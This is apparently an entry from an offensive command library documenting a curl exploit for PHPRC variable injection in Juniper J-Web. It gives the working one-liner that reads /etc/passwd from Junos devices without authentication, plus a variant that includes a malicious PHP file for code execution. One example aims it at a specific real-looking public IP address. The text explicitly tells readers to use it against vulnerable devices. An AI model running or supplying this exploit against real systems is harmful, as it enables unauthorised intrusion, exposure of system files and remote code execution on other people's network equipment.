---
id: cmd-uuid-123
data: >-
  curl -sk "https://TARGET_IP/?PHPRC=/dev/fd/0" -X POST -d
  'auto_prepend_file="/etc/passwd"'
tags:
  - rce
  - exploit
  - http
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:07.872Z'
verified: false
validated: true
submitted: true
---
# curl-php-phprc-injection

## Command

```bash
curl -sk "https://TARGET_IP/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'
```

## Description

This command sends a crafted HTTPS POST request to exploit PHP external variable modification in Juniper J-Web, setting PHPRC to /dev/fd/0 for config injection via stdin and auto_prepend_file to /etc/passwd for arbitrary file inclusion, demonstrating RCE. Use it against vulnerable Junos OS devices for unauthenticated exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode: Suppress progress meter | Yes |
| `-k` | Insecure: Skip SSL certificate verification | Yes (for self-signed certs) |
| `URL` | Target J-Web endpoint with ?PHPRC=/dev/fd/0 query | Yes |
| `-X POST` | Specify HTTP POST method | Yes |
| `-d` | POST data: auto_prepend_file payload | Yes |

## Examples

### Basic Usage

```bash
curl -sk "https://41.205.30.222/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'
```

### Advanced Usage

```bash
curl -sk "https://TARGET_IP/?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/path/to/malicious.php"' -v
```

> Adds -v for verbose output to inspect headers and response.

## Expected Output

Server response showing inclusion of /etc/passwd, such as echoed user data or PHP warnings revealing file content, confirming successful variable modification and file processing. For example: output containing 'root:x:0:0:root:/root:/bin/sh' lines from /etc/passwd.

## Related

- [[Related Procedure: Exploit-PHP-PHPRC-Injection-via-J-Web]]
